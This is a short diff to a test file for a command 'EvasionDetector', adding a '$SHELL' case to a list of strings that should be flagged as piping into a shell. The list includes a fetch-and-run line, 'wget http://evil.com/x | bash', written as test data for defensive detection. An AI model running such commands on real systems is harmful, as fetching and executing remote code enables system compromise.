@@ -82,6 +82,7 @@ describe('EvasionDetector', () => {
       'wget http://evil.com/x | bash',
       'cat script | zsh',
       'echo cmd | $0',
+      'echo cmd | $SHELL',
     ])('detects pipe to shell in "%s"', (cmd) => {
       expect(flags(cmd).hasPipeToShell).toBe(true);
     });
